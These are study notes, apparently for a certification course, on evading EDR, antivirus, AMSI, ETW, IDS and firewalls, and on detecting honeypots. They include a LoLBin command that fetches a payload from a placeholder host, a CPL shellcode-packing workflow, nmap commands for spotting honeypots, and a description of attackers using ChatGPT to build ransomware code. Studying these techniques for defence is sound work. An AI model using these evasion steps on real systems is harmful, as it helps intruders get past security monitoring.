			- Microsoft Office macros are widely used to automate tasks, but attackers can exploit them to execute malicious code and compromise systems. Since macros are based on VBScript, attackers craft VBA-based malicious code to manipulate system memory, modify the Windows registry, and alter system files. Dechaining macros is a technique used to evade both static and dynamic detection mechanisms in endpoint security solutions.
			- Techniques for Bypassing Endpoint Security Using Dechained Macros:
				- Spawning Through ShellCOM: Attackers leverage COM objects to spawn processes. By referencing any COM-associated object through VBScript, they can execute arbitrary functions. The ShellBrowserWindow object is commonly used to launch new processes.
				- Spawning Using XMLDOM: Attackers use XMLDOM (XML Document Object Model) to execute process spawning. This technique allows them to download and run code within an active Office process, bypassing security restrictions.
				- Spawning Through WmiPrvse.exe: To launch new processes or executables remotely, attackers exploit Windows Management Instrumentation (WMI). By spawning processes through wmiprvse.exe, attackers can execute code outside the Office process, avoiding detection.
				- Creating Scheduled Tasks: VBScript can be used to create scheduled tasks, allowing attackers to execute malicious payloads at specific times. This technique also enables task dechaining, ensuring the payload executes independently of the original Office macro.
				- Registry Modification: Attackers leverage VBScript to modify the Windows registry, altering system settings, storing payloads, and establishing persistence. Since registry modifications can execute payloads on system boot, the payload execution is decoupled from the macro itself, making detection more difficult.
				- Dropping Files: Using FileSystemObject, attackers can drop files onto the system through VBScript. This method enables dechaining, as payload execution occurs at startup rather than during macro execution.
				- Downloading Content: Attackers use VBScript to download and inject malicious content into memory, the registry, or disk. This is achieved using the XMLHTTP library along with ADODB, allowing attackers to deliver and execute payloads stealthily.
				- Embedding and Dropping Files: Attackers exploit Metasploit’s "vba-exe" feature to create a macro containing an embedded payload. When executed, this payload is dropped onto the system and run, bypassing security controls.
		- Bypassing Endpoint Security by Clearing Memory Hooks:
			- Memory hooking is a technique used to monitor and modify an application's execution process. Endpoint Detection and Response (EDR) agents place these hooks to collect information for behavior-based analysis. These hooks send data to the EDR agent, which operates at a high-privileged kernel level, helping detect malicious activities such as remote code execution, lateral movement, and privilege escalation in real time.
			- For example, if a new process is spawned in a detached state and memory permissions are altered to execute the WriteProcessMemory procedure, the EDR system can still analyze the data and determine whether the running process is malicious.
			- To evade detection, attackers often attempt to bypass EDR monitoring by unhooking EDR-related DLLs from memory. This requires identifying the application's DLLs, associated functions, and exported syscalls. Open-source tools such as the x64dbg debugger are commonly used to locate hooked syscalls stored in memory during execution.
			- Attackers then craft a payload to overwrite these memory hooks by restoring the original bytes of data. This is achieved by reloading the correct memory location where the hooks reside and erasing the EDR-imposed hooks. Once the syscalls are successfully restored, the EDR’s DLL remains on disk but no longer receives any information, as the hooks have been removed.
			- Additionally, attackers can execute malicious payloads using custom assembly code and syscalls to evade EDR detection. Since these syscalls are not exported from system DLLs, EDR solutions fail to detect any activity because their hooks are not triggered. To achieve this, attackers must configure specific variables and registry values to execute their own syscalls while also determining the correct syscall IDs, which vary depending on the target OS and version.
		- Bypassing Endpoint Security with Process Injection:
			- Process injection is a sophisticated technique used by attackers to inject malicious code into the memory of running processes. By injecting code into an active process, malware can evade detection by security software, which often does not continuously monitor the internal state of every process for such modifications. This technique is commonly used as part of a broader attack strategy to maintain persistence, escalate privileges, or execute malicious actions while avoiding detection.
			- Process injection attacks are typically carried out using Windows API functions, such as VirtualAllocEx(), WriteProcessMemory(), and CreateRemoteThread():
				- VirtualAllocEx(): Allocates memory within the address space of a target process. Attackers use this function to reserve a memory block in the target process where they can inject their malicious payload.
				- WriteProcessMemory(): Writes data into the memory space of a remote process. After allocating memory with VirtualAllocEx(), the attacker calls WriteProcessMemory() to inject the malicious payload into the allocated memory space.
				- CreateRemoteThread(): Creates a new thread in the address space of the target process. After injecting the malicious payload, the attacker calls CreateRemoteThread() to execute the injected code within the target process.
			- By leveraging these API functions, attackers can effectively run malicious code within legitimate processes, making detection and mitigation significantly more challenging for security solutions.
    	- Bypassing EDR by Leveraging Living-off-the-Land Binaries (LoLBins):
			- Living off the Land Binaries (LoLBins) are legitimate system tools that come preinstalled on the operating system or are downloaded from trusted sources such as Microsoft. Attackers can exploit these LoLBins for malicious purposes, such as installing malware or maintaining persistence on target networks. By leveraging LoLBins, attackers can evade security solutions since their activities appear normal and authorized.
			- These tools also enable attackers to execute various malicious activities, such as installing command-and-control (C2) agents for advanced post-exploitation control, without triggering alerts or being detected by Endpoint Detection and Response (EDR) systems.
			- Steps to Bypass EDR Using LoLBins
				- Step 1: Payload Generation
					- Configure the agent in Deimos C2 (a Golang-based command-and-control framework) to communicate over HTTPS.
					- Download the generated agent and upload it to an external HTTP server.
				- Step 2: Agent Download
					- Execute the following command to use a Windows binary to download a remote file from the specified URL:
					- C:\> ConfigSecurityPolicy.exe http://example.com/payload
				- Step 3: Agent Execution
					- Use CustomShellHost.exe to execute the downloaded payload and replace Explorer.exe with a custom application.
					- On Windows 10 or 11, attackers with user privileges can run the following command to achieve this:
					- C:\> CustomShellHost.exe
			- By abusing LoLBins, attackers can effectively bypass EDR monitoring and execute malicious payloads while appearing to use legitimate system tools.
		- Bypassing Endpoint Security Using CPL (Control Panel) Side-Loading:
			- CPL files are typically developed for Windows Control Panel applets, providing quick access to various system tools. However, attackers can exploit CPL files to evade detection by leveraging legitimate .cpl files, which are commonly associated with Windows Control Panel utilities. This technique, known as CPL sideloading, mimics the functionality of a legitimate CPL applet, making malicious activities appear legitimate to both users and security systems.
			- When a user executes a legitimate CPL file, malicious code embedded within the file is loaded. This can be achieved through various methods such as executing a specific function within the CPL file or exploiting vulnerabilities in how Windows handles CPL files.
			- Attackers embed malicious payloads in CPL files and trick Windows into loading them via trusted applications instead of executing them directly. This can involve modifying application configuration files or leveraging startup execution for persistence. Since CPL files are rarely flagged as malicious, traditional security solutions often overlook them during routine scans.
			- A common method involves renaming malicious DLLs (.dll) files with a .cpl extension and registering them at a specific location in the Windows Registry. Even if they lack standard CPL functions, they can still execute via DllEntryPoint when the Control Panel is accessed.
			- Creating Malicious CPL Files Using CPLResourceRunner:
				- Attackers can use tools such as CPLResourceRunner to generate malicious CPL files by following these steps:
				- Step 1: Generate a Payload
					- Use Cobalt Strike to generate a fully staged payload in x86 format, saving it as beacon.bin.
				- Step 2: Convert the Payload to Shellcode
					- Execute ConvertShellcode.py on beacon.bin to transform it into usable shellcode and save it as shellcode.txt.
				- Step 3: Encode the Shellcode in Base64
					- Run the following command to encode shellcode.txt into Base64 format for inclusion in a resource file:
					- cat shellcode.txt | sed 's/[, ]//g; s/0x//g;' | tr -d '\n' | xxd -p -r | gzip -c | base64 > b64shellcode.txt
				- Step 4: Prepare the Resource File
					- Copy the encoded content from b64shellcode.txt into Resources.txt in the same folder.
				- Step 5: Compile the Malicious CPL File
					- Compile the resources in x86 format and copy CPLResourceRunner.dll into a new file named maliciousnew.cpl.
			- By leveraging CPL sideloading, attackers can effectively bypass security measures, execute malicious payloads through trusted system components, and evade traditional detection mechanisms.
    	- Abusing AI Tools - Bypassing Endpoint Security Using ChatGPT:
			- Attackers can leverage ChatGPT to mutate malicious code and generate multiple variations, making detection more difficult for security systems.
			- Steps Involved in the Attack
				- Obtaining the Code: In this phase, attackers use ChatGPT to generate code snippets for locating specific files that ransomware may target for encryption. They can also request ChatGPT to generate a file-encryption utility, enabling them to encrypt files once they have been identified.
				- Validation: Attackers review and refine the generated code to ensure it functions as intended while maintaining stealth.
				- Execution: Once the malicious code is ready, attackers execute it using built-in Python functions such as: compile(source, mode, exec), exec(), eval(). These functions allow the malware to run dynamically on different platforms. Additionally, malware with a built-in Python interpreter can execute the code directly, then erase it afterward to evade detection by security systems.
    	- Bypassing Antivirus Using Metasploit Templates:
			- Attackers aim to ensure that their malicious payloads bypass antivirus detection on victim machines. One common technique involves using Metasploit Templates to evade security measures.
			- Attackers generate a malicious payload using msfvenom and analyze the file using VirusTotal to determine its detection rate. Based on the results, they continuously modify the Metasploit Templates to reduce detection and successfully evade antivirus software.
    	- Bypassing Windows Antimalware Scan Interface (AMSI):
			- The Antimalware Scan Interface (AMSI) is a Windows API designed to enhance malware protection by integrating with compatible antimalware software. It provides signature-based and reputation-based detection to identify malicious activity. However, attackers can bypass AMSI by manipulating functions, URLs, or internal system files to evade detection.
			- Techniques for Bypassing AMSI:
				- PowerShell Downgrade: Attackers can downgrade PowerShell to version 2.0, which lacks AMSI integration, allowing them to execute blocked commands like amsiutils.
				- Obfuscation: Obfuscation involves modifying and obscuring malicious code to evade AMSI detection. Attackers achieve this by breaking strings and concatenating them using the + operator. Tools like AmsiTrigger help attackers identify specific lines that trigger AMSI scans for targeted obfuscation.
				- Forcing an Error: This technique exploits AMSI’s initialization process by modifying the amsiInitFailed() function. Normally, this function returns 0 (indicating a successful scan), but attackers can modify it to Boolean True, forcing an error during AMSI initialization. This allows them to bypass AMSI by altering memory allocations within the AmsiUtils class.
				- Memory Hijacking: Attackers manipulate AMSI’s internal functions using memory hijacking. By hooking the AmsiScanBuffer() function, they force it to always return AMSI_RESULT_CLEAN, effectively allowing any malware to execute undetected.
		- Hosting Phishing Sites on Popular Infrastructure:
			- Organizations use Endpoint Detection and Response (EDR) to block malicious IP addresses associated with phishing campaigns and other cyber threats. These blacklists are continuously updated from various sources. However, attackers exploit this by hosting phishing sites on trusted cloud infrastructure such as Google Cloud and AWS, which are rarely blacklisted.
			- Since most popular cloud hosting services are not included in EDR blacklists, attackers use them as Command and Control (C&C) servers to carry out malicious activities. Additionally, attackers can distribute malware via social media platforms by embedding malicious code in images or multimedia files using steganography. Pre-infected malware on the victim's machine extracts hidden instructions from these files to bypass endpoint security mechanisms.
		- Passing Encoded Commands:
			- Attackers encode their malicious commands to bypass detection mechanisms. A common technique is Base64 encoding, which helps conceal malicious arguments and scripts. Additionally, hex-format encoding can be used to obfuscate ping requests to evade security tools.
		- Fast Flux DNS Method:
			- Attackers employ fast flux DNS to rapidly change both IP addresses and domain names, making detection more difficult. This technique is frequently used by large botnets to evade blacklists and security filters. By using compromised systems as reverse proxies, attackers can conceal the actual C&C server, ensuring that victims only interact with fast flux agents instead of the real malicious server.
		- Timing-Based Evasion:
			- Timing-based evasion is a sandbox detection bypass technique where malware delays execution until certain conditions are met.
			- These conditions can include:
				- Waiting for specific user actions, such as opening a window or clicking a button.
				- Delaying execution until system reboot to blend with legitimate processes.
				- Using sleep patching, delay APIs, or time bombs to avoid early detection by security software.
    	- Signed Binary Proxy Execution:
			- This technique leverages trusted system utilities to execute malicious code while avoiding EDR detection. Since these utilities are digitally signed by legitimate vendors, they are considered safe by security solutions. Attackers often use rundll32.exe to execute malicious payloads by proxying them through trusted Windows processes.
    	- Shellcode Encryption:
			- Attackers encrypt malicious shellcode to evade EDR detection.
			- Common encryption methods include:
				- XOR and RC4 encryption, where decryption keys are embedded in the malware or generated dynamically.
				- AES encryption, which hides static signatures of shellcode, making it harder for security tools to detect.
				- Once executed, the malware decrypts the shellcode in memory and runs it without writing anything suspicious to disk, making it difficult for security solutions to detect.
		- Reducing Entropy:
			- Attackers manipulate a binary’s characteristics to make it appear less suspicious to security solutions. One method is reducing entropy, which involves embedding low-entropy resources (e.g., low-entropy images) into the binary. Attackers can also add legitimate system strings, such as chrome.dll, to lower the binary’s entropy and avoid detection.
    	- Escaping Local Antivirus (AV) Sandboxes:
			- EDR solutions often analyze binaries within a local sandbox for a short period (typically a few seconds) to assess their behavior while minimizing impact on user experience. Attackers exploit this limitation by delaying shellcode execution to outlast the sandbox analysis window. One technique involves performing CPU-intensive tasks, such as calculating large prime numbers, to prolong the decryption process of shellcode, thereby bypassing sandbox-based behavioral detection.
    	- Disabling Event Tracing for Windows (ETW)
		- Disabling Event Tracing for Windows (ETW):
			- Many EDR solutions, especially Microsoft Defender for Endpoint, rely on Event Tracing for Windows (ETW) to monitor system activity.
			- ETW includes:
				- Kernel-level components, which register callbacks for system and kernel operations.
				- Userland components within ntdll.dll, allowing detailed tracking of Windows API calls.
			- Attackers can bypass ETW by patching the EtwEventWrite function, a key function in ntdll.dll. By modifying its instructions to return zero (SUCCESS), attackers effectively disable ETW logging and evade detection.
		- Direct System Calls and Evading “Mark of the Syscall”:
			- Security solutions often hook API functions in ntdll.dll to monitor malicious activity. Attackers bypass these hooks by using direct system calls instead of standard API calls.
			- For example:
				- Instead of calling VirtualAlloc, attackers call its kernel-equivalent function NtAllocateVirtualMemory directly from ntdll.dll.
				- Attackers can retrieve syscall IDs from ntdll.dll, push the required arguments onto the stack, and invoke system calls using syscall <id> instructions, bypassing security hooks.
    	- Spoofing the Thread Call Stack:
			- Malware implants often exhibit beaconing behavior, where they remain dormant until receiving commands from a Command and Control (C2) server. During this idle state, EDR solutions use memory scanning techniques to detect anomalies.
			- A common detection method is analyzing thread return addresses—if a return address points to shellcode in memory, it is flagged as suspicious. Attackers evade this by spoofing the call stack:
				- Intercepting Sleep(): When malware calls Sleep(), attackers overwrite the return address with 0×0, breaking the link between the shellcode and the return address.
				- After Sleep() returns, they restore the original return address, ensuring normal execution resumes without detection.
		- In-memory Encryption of Beacons:
			- To evade memory-based detection, attackers encrypt the executable memory regions of malware when it is dormant.
			- This is done through:
				- Identifying a beacon sleep hook (e.g., Sleep()).
				- Locating the memory segment containing shellcode.
				- If the memory segment is MEM_PRIVATE and EXECUTABLE, encrypting it using XOR or another lightweight encryption algorithm.
				- Calling Sleep(), pausing execution while the shellcode remains encrypted.
				- Upon Sleep() return, decrypting and restoring the shellcode for execution.
			- By encrypting malicious code while dormant and decrypting it only when needed, attackers significantly reduce the risk of detection by security solutions.
- IDS/Firewall Evading Tools:
	- Traffic IQ Professional (www.idappcom.com):
		- Traffic IQ Professional is a security auditing and validation tool designed to assess the behavior of security devices by generating standard application traffic or attack traffic between two virtual machines. It is commonly used by security professionals to evaluate and test non-proxy packet-filtering devices, such as: Application firewalls, IDS, IPS, Routers and switches.
		- However, due to its ability to generate custom attack traffic, attackers can misuse this tool to bypass perimeter security devices within a target network, evading detection and exploiting vulnerabilities.
	- Nmap (nmap.org)
	- Metasploit (www.metasploit.com)
	- PingRAT (github.com)
	- KoviD (github.com)
	- Green Tunnel (github.com)
	- Hyperion (nullsecurity.net)
- Packet Fragment Generator Tools:
	- Attackers use various packet fragment generators to conduct fragmentation attacks on firewalls, allowing them to bypass security measures.
	- Colasoft Packet Builder (www.colasoft.com):
		- Colasoft Packet Builder is a tool designed to create and manipulate custom network packets, including fragmented packets. Attackers exploit this tool to craft malicious packets and fragment them in a way that firewalls fail to detect.
		- The tool allows the creation of various types of network packets, including: Ethernet Packets, ARP Packets, IP Packets, TCP Packets, UDP Packets
		- While security professionals use Colasoft Packet Builder to test network defenses against attacks and intrusions, attackers misuse it to evade firewall detection and execute fragmentation-based exploits.
	- NetScanTools Pro (www.netscantools.com)
	- CommView (www.tamos.com)
	- Ostinato (ostinato.org)
	- WAN Killer (www.solarwinds.com)
	- WireEdit (omnipacket.com)

- Honeypot:
	- A honeypot is a computer system or information system resource on the Internet designed to attract and trap individuals attempting unauthorized or illicit access to an organization’s network. It is a decoy system used to monitor and log malicious activity, often enabling security teams to analyze attack methods and report offenders to their ISPs.
	- Honeypots have no legitimate business or production value; any interaction with them is typically indicative of a probe, attack, or compromise attempt. While they do not directly solve a specific security problem, they serve as highly flexible tools with various security applications, including attack prevention, threat detection, and cybersecurity research.
	- A honeypot can log port access attempts, monitor an attacker's keystrokes, and provide early warnings of potential cyber threats. However, maintaining a honeypot requires significant effort and resources.
	- Types of Honeypots:
		- Classification of Honeypots Based on Design Criteria:
			- Low-Interaction Honeypots:
				- Low-interaction honeypots emulate only a limited number of services and applications of a target system or network. If an attacker performs an action that the emulation does not anticipate, the honeypot simply generates an error. These honeypots capture limited information, primarily transactional data and basic interactions. Since they do not provide full system access, they cannot be fully compromised. Their primary purpose is to collect high-level information about attack vectors, such as network probes and worm activities.
				- Some examples of low-interaction honeypots include Tiny-SSH-Honeypot, KFSensor, and Honeytrap:
				- KFSensor:
					- A low-interaction honeypot used to attract and identify penetration attempts. It simulates vulnerable system services and Trojans to lure hackers. KFSensor can monitor all TCP, UDP, and ICMP ports and services, raising alerts for activities such as port scanning and DoS attacks.
				- Honeytrap:
					- A low-interaction honeypot designed to observe attacks against TCP and UDP services. It runs as a daemon, dynamically initiating server processes on requested ports. Attackers are tricked into sending responses to the Honeytrap server process. The received data is concatenated into a string and stored in a database file, known as the attack string.
					- Honeytrap also analyzes attack strings for commands that request the server to download a file from another host on the network. If such a command is detected, the server attempts to retrieve the corresponding file automatically. It supports only FTP and TFTP protocols and is also capable of identifying and logging HTTP URIs.
			- Medium-Interaction Honeypots:
				- Medium-interaction honeypots simulate an actual operating system, along with applications and services of a target network. They provide a more convincing illusion of a real OS than low-interaction honeypots, allowing for the logging and analysis of more complex attacks. These honeypots capture more valuable data than low-interaction honeypots but can only respond to preconfigured commands, which increases the risk of intrusion.
				- One major drawback of medium-interaction honeypots is that attackers may quickly recognize abnormal system behavior, making them aware of the deception.
				- Some examples of medium-interaction honeypots include Cowrie, Honeygrove, and Kippo:
				- Cowrie:
					- A medium-to-high interaction SSH and Telnet honeypot designed to log brute-force attacks and shell interactions performed by attackers.
					- In medium-interaction mode (shell), Cowrie emulates a UNIX system using Python.
					- In high-interaction mode (proxy), it functions as an SSH and Telnet proxy, allowing security researchers to observe an attacker’s behavior on another system.
			- High-Interaction Honeypots:
				- Unlike low- and medium-interaction honeypots, high-interaction honeypots do not emulate services or applications; instead, they run actual vulnerable software on real operating systems and production environments. These honeypots simulate all services and applications of a target network, allowing attackers to fully compromise the system within a controlled environment.
				- High-interaction honeypots capture extensive data about attack vectors, including techniques, tools, and intent. However, since they involve real systems, they are more susceptible to infection, as attacks are executed on actual production systems.
				- A honeynet is a prime example of a high-interaction honeypot. Unlike a standalone product or software solution, a honeynet is an entire network of computers designed to attract and analyze attacks. It provides a highly controlled environment with real systems running real applications, where all activities are carefully monitored and logged. Attackers discover and infiltrate honeynets on their own, unaware that they are being observed.
				- To capture all attacker activities—such as encrypted SSH sessions, emails, and file uploads—honeynets use kernel-level monitoring tools. At the same time, they regulate attacker behavior through a honeywall gateway, which:
					- Allows inbound traffic to reach the target systems.
					- Controls outbound traffic using intrusion prevention technologies, preventing attackers from harming non-honeynet computers.
				- This setup gives attackers the illusion of unrestricted access while ensuring that their actions remain contained and monitored.
			- Pure Honeypots:
				- Pure honeypots replicate the real production network of a target organization, deceiving attackers into believing they are infiltrating critical systems. By engaging attackers and consuming their time and resources, these honeypots help security teams identify vulnerabilities and potential threats.
				- As attackers probe the system, they trigger alerts that allow network administrators to detect early warning signs of an attack, enabling them to take proactive measures to reduce the risk of an actual intrusion.
		- Classification of Honeypots Based on Deployment Strategy:
			- Production Honeypots:
				- Production honeypots are deployed within an organization’s production network alongside other operational servers. While they enhance the overall security posture of the organization, they capture only a limited amount of information about adversaries. These honeypots typically fall under the low-interaction honeypot category and are widely used by large organizations and corporations.
				- Since production honeypots are deployed internally, they also help identify internal security flaws and detect insider threats within an organization.
			- Research Honeypots:
				- Research honeypots are high-interaction honeypots primarily used by research institutions, governments, and military organizations to study intruder behavior in detail. These honeypots enable security analysts to gain in-depth insights into attack methodologies, vulnerability exploitation, and attacker techniques. This knowledge helps organizations improve their attack prevention, detection, and response mechanisms, ultimately strengthening their overall cybersecurity infrastructure.
				- However, research honeypots do not directly contribute to an organization’s security. Companies looking to enhance their production infrastructure security should prioritize production honeypots instead.
		- Classification of Honeypots Based on Deception Technology:
			- Malware Honeypots:
				- Malware honeypots are designed to detect and analyze malware campaigns targeting network infrastructure. These honeypots simulate known vulnerabilities, such as outdated APIs and vulnerable SMBv1 protocols, and emulate various Trojans, viruses, and backdoors to attract adversaries into exploiting them. By luring attackers and malware into performing attacks, security teams can effectively identify attack patterns, malware signatures, and threat actors behind the campaigns.
			- Database Honeypots:
				- Database honeypots use fake, intentionally vulnerable databases to attract attackers attempting SQL injection, database enumeration, and other database-related attacks. These databases appear to contain sensitive information, such as customer credit card details and employee records, tricking attackers into attempting exploitation. However, all stored data is simulated and fake.
				- By analyzing these attacks, security analysts can identify attack patterns and threat actor tactics, techniques, and procedures (TTPs) related to database exploitation.
			- Spam Honeypots:
				- Spam honeypots are designed to attract spammers who abuse open mail relays and proxies to distribute spam. These honeypots typically consist of mail servers that deliberately accept emails from any random source on the Internet. They help security teams gather crucial information about spammers, their tactics, and their infrastructure, aiding in anti-spam measures.
			- Email Honeypots:
				- Also known as email traps, email honeypots consist of fake email addresses designed to attract and collect malicious emails sent by adversaries. These fake email addresses are distributed across the open Internet and dark web, luring threat actors into sending phishing, scam, or malware-laden emails.
				- By continuously monitoring incoming emails, security teams can analyze deception techniques used by attackers and warn internal employees about emerging email-based threats.
			- Spider Honeypots:
				- Also called spider traps, spider honeypots are designed to capture malicious web crawlers and spiders used by attackers for web reconnaissance and data extraction. Threat actors often use automated crawling tools to gather URLs, contact details, and directory structures from websites.
				- To counter this, a fake website is set up to mimic a legitimate one. Any entity attempting to crawl the trap site is identified, monitored, and blacklisted, preventing them from gathering valuable information.
			- Honeynets:
				- Honeynets are networks of interconnected honeypots designed to provide a broader view of adversary tactics. They are typically deployed in isolated virtual environments and may include vulnerable servers to attract attackers.
				- By monitoring adversary behavior across multiple honeypots, honeynets help security teams analyze enumeration methods, exploitation techniques, and attacker capabilities in a real-world attack scenario. This intelligence is invaluable for enhancing security defenses and mitigating threats effectively.
	- Honeypot Tools:
		- HoneyBOT (www.atomicsoftwaresolutions.com): HoneyBOT is a medium-interaction honeypot designed for Windows. It provides a safe environment for capturing and analyzing unsolicited network traffic, making it an effective tool for network security research and early-warning intrusion detection systems (IDS). With its easy-to-use interface, HoneyBOT is suitable for both security researchers and organizations looking to enhance their cyber threat intelligence.
		- Blumira honeypot software (www.blumira.com)
		- NeroSwarm Honeypot (neroswarm.com)
		- Valhala Honeypot (sourceforge.net)
		- Cowrie (github.com)
		- StingBox (www.stingbox.com)
	- Detecting Honeypots:
		- For attackers, detecting honeypots within a target organization's network is crucial to avoid security traps. To identify these decoys, attackers employ various techniques, such as service fingerprinting, analyzing response times, identifying unexpected open ports, and detecting weak system configurations. By carefully examining these factors, they attempt to evade detection and maintain stealth within the target network.
		- Methods for Detecting Honeypots:
			- Fingerprinting the Running Service:
				- Service fingerprinting involves identifying the specific services running on a network device. Since honeypots often emulate services, they may not perfectly replicate all aspects of a real service, leading to detectable discrepancies.
				- Attackers use tools like Nmap to conduct detailed scans, sending various probes to the target and analyzing their responses to determine whether a service is genuine or emulated.
				- Example - This command identifies the web server type and version running on port 80: nmap -sV -p 80 <target_ip>
				- Indicators of Honeypot:
					- Inconsistencies between claimed and actual service behavior (e.g., a service claims to be one version but behaves like another).
					- Partial or incorrect implementation of expected features (e.g., a web server may lack essential functionalities that a real server would have).
			- Analyzing Response Time:
				- Response time analysis is a crucial technique for detecting honeypots within a target network. Honeypots often exhibit slower or inconsistent response times due to additional layers of logging, monitoring, and emulation. This extra processing introduces noticeable latency compared to real production systems.
				- Attackers measure latency across various network services and compare the results with expected norms. Tools like Ping, Traceroute, and Nmap are commonly used to measure round-trip times (RTT) of packets, helping identify anomalies.
				- Example - This command measures response times for HTTP services by introducing delays and limiting retries: nmap -p 80 --scan-delay 1s --max-retries 5 <target_ip>
				- Indicators of Honeypot:
					- Consistently high response times compared to normal network behavior.
					- Unusual variability in response times, indicating additional processing layers.
			- Analyzing MAC Address:
				- Attackers analyze MAC addresses to detect honeypots within a target organization's network. Each MAC address has a specific prefix, known as an Organizationally Unique Identifier (OUI), which identifies the manufacturer of the network interface card (NIC). By examining irregularities in MAC addresses, attackers can detect virtualization technologies or honeypot software, as these often use virtual or non-standard OUIs.
				- Example - This command enumerates MAC addresses on the local network: arp-scan --interface=eth0 --localnet
				- Indicators of Honeypot:
					- MAC addresses with unusual OUIs that do not correspond to known hardware manufacturers.
					- MAC addresses associated with virtual machines (e.g., VMware, VirtualBox, or Hyper-V).
			- Enumerating Unexpected Open Ports:
				- Identifying unexpected open ports in a target network is a key technique for detecting honeypots. Honeypots often have open ports that are not typically active on regular systems or may display a higher-than-normal number of open ports. This discrepancy serves as a red flag for attackers.
				- Port-scanning tools like Nmap can be used to enumerate open ports and identify unusual network behavior.
				- Example - This command scans all 65,535 ports on the target IP, revealing which ports are open and what services may be running: nmap -p- <target_ip>
				- Indicators of Honeypot:
					- A standard web server typically has only ports 80 (HTTP) and 443 (HTTPS) open.
					- If a scan reveals additional open ports—such as 22 (SSH), 21 (FTP), or various high-numbered ports without a clear purpose—it may indicate a honeypot.
			- Analyzing System Configuration and Metadata:
				- This method involves scrutinizing system details that are often overlooked to detect honeypots within a network. Attackers examine configuration settings, system metadata, and environmental information to uncover inconsistencies or default settings that may indicate a honeypot.
				- By analyzing system banners (e.g., SSH welcome messages, HTTP headers) and metadata, attackers gather information about the operating system, software versions, and configuration details to identify anomalies.
				- Indicators of Honeypot:
					- Default configurations that have not been modified.
					- Outdated banners revealing obsolete software versions.
					- Discrepancies in system information that do not match typical production environments.
	- Detecting and Defeating Honeypots:
		- A honeypot is a security mechanism designed to trap and analyze attackers' activities. By luring attackers into interacting with a controlled system, security teams can gain insights into potential threats to their network infrastructure. However, for attackers, distinguishing between a real system and a honeypot is crucial to avoiding detection. Identifying and bypassing honeypot defenses is a fundamental skill for professional hackers.
		- The following techniques are commonly used to detect, identify, and defeat various honeypot infrastructures:
			- Detecting Layer 7 Tar Pits:
				- Layer 7 tar pits slow down unauthorized activities, particularly SMTP-based attacks. They achieve this by introducing delays in responses to spam or hacking attempts.
				- Detection Method: Attackers can identify Layer 7 tar pits by analyzing response latencies.
				- Indicators: Abnormally slow responses to SMTP commands can indicate the presence of a tar pit.
			- Detecting Layer 4 Tar Pits:
				- Layer 4 tar pits manipulate the TCP/IP stack to slow down worms, backdoors, and automated threats. They achieve this by accepting incoming connections and then setting the TCP window size to zero, preventing data transmission.
				- Detection Method: Attackers analyze TCP window sizes and connection behavior.
				- Indicators: Continuous ACK packets with a zero TCP window size suggest a tar pit. Example: LaBrea honeypot.
			- Detecting Layer 2 Tar Pits:
				- Layer 2 tar pits block unauthorized access within the same local network to prevent lateral movement.
				- Detection Method: Attackers examine MAC addresses and ARP responses.
				- Indicators: The presence of MAC address 00:00:0F:FF:FF:FF suggests a Layer 2 tar pit.
			- Detecting Honeypots Running on VMware:
				- VMware is widely used for running virtual honeypots. Since each virtual machine has a unique MAC address prefix, attackers can detect honeypots using this method.
				- Detection Method: Attackers inspect MAC address prefixes using IEEE OUI listings.
				- Indicators: MAC addresses belonging to VMware Inc. (e.g., 00:05:69, 00:0C:29) indicate a virtual environment.
			- Detecting Honeyd Honeypots:
				- Honeyd is a widely used honeypot daemon that simulates entire network environments.
				- Detection Method: Attackers use time-based TCP fingerprinting to analyze SYN-ACK responses.
				- Indicators: Differences in response timing between a honeypot and a real system expose its presence.
			- Detecting User-Mode Linux (UML) Honeypots:
				- User-Mode Linux (UML) is an open-source tool used for deploying honeypots. It can be detected by analyzing system files.
				- Detection Method: Attackers check system files for UML-specific entries.
				- Indicators: Presence of UML-specific files such as: /proc/mounts, /proc/interrupts, /proc/cmdline
			- Detecting Snort_inline Honeypots:
				- Snort_inline is a modified version of Snort IDS that allows real-time packet manipulation to block known threats.
				- Detection Method: Attackers analyze outgoing packets for modifications.
				- Indicators:
					- Dropped outgoing packets may suggest a black hole effect.
					- Modified packets can be identified by cross-checking them from another host.
			- Detecting Fake Access Points (Fake APs):
				- Fake APs create bogus 802.11 beacon frames to mislead attackers. However, they do not generate real traffic.
				- Detection Method: Attackers monitor wireless network traffic.
				- Indicators: A large number of beacon frames with no actual network traffic suggest a Fake AP.
			- Detecting Bait and Switch Honeypots:
				- Bait and switch honeypots dynamically redirect malicious traffic to a honeypot once an attack is detected.
				- Detection Method: Attackers analyze TCP/IP parameters such as: Round-Trip Time (RTT), Time To Live (TTL), TCP timestamps
				- Indicators: If these values change unexpectedly during an attack, it may indicate a honeypot redirecting traffic.
	- Honeypot Detection Tools:
		- Attackers use honeypot detection tools such as Send-Safe Honeypot Hunter and SniffingBear to identify honeypots within target organizational networks.
		- Send-Safe Honeypot Hunter (www.send-safe.com):
			- Send-Safe Honeypot Hunter is a tool designed to scan and identify honeypots within lists of HTTPS and SOCKS proxies. It can check multiple proxy lists simultaneously and automate validation processes.
			- Features: It supports checking HTTPS, SOCKS4, and SOCKS5 proxies with any port, processes multiple remote or local proxy lists at once, automatically validates proxy lists at specified intervals, and can upload filtered lists ("Valid proxies" and "All except honeypots") to an FTP server. Additionally, it can be used for standard proxy validation.
- IDS/Firewall Evasion Countermeasures:
	- Defend Against IDS Evasion:
		- Shut down switch ports linked to known attack hosts and drop packets with invalid or spoofed source IPs.
		- Analyze ambiguous network traffic and packets arriving from non-IDS paths for potential threats.
		- Use TCP FIN or Reset (RST) packets to terminate malicious TCP sessions.
		- Detect non-standard NOP opcodes to counter polymorphic shellcode.
		- Train users to recognize attack patterns and keep systems, network devices, and antivirus signatures updated.
		- Deploy IDS after assessing network topology, traffic nature, and host count.
		- Use a traffic normalizer to eliminate ambiguity and ensure proper reassembly of fragmented packets.
		- Define DNS servers in network devices and harden communication equipment like modems and routers.
		- Block ICMP TTL expired packets at the external interface and adjust TTL for proper packet delivery.
		- Store attack data (attacker IP, victim IP, timestamp, etc.) for future analysis.
		- Configure Snort rules properly to prevent false positives, DoS attacks, and detect malicious scripts.
		- Use hybrid exploit protection combining statistical and behavioral analysis to counter zero-day IDS evasion.
		- Detect tunneling, obfuscation techniques, and polymorphic behavior through heuristic analysis.
		- Deploy high-interaction honeypots with realistic services.
		- Ensure IDS can handle overlapping fragments and reassemble fragmented sessions effectively.
	- Defend Against Firewall Evasion:
		- Configure the firewall to filter out intruder IPs and deny all traffic by default, enabling only required services.
		- Run firewall services under a unique user ID instead of administrator or root.
		- Set up a remote syslog server with strict access controls to prevent tampering.
